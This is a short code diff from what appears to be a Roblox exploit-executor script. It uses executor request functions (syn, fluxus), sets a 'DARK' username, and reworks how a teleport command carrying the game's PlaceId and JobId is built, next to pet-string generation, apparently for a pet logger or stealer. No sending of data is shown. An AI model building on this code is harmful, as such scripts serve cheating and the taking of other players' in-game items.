@@ -339,7 +339,14 @@ getgenv().Username = "DARK"
 
         local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
 
-        local tpScript = game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")
+        
+        local tpScript = string.format(
+            'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")',
+            game.PlaceId,
+            game.JobId
+        )
+        
+
 
         -- Update pet string generation
         local petString = ""
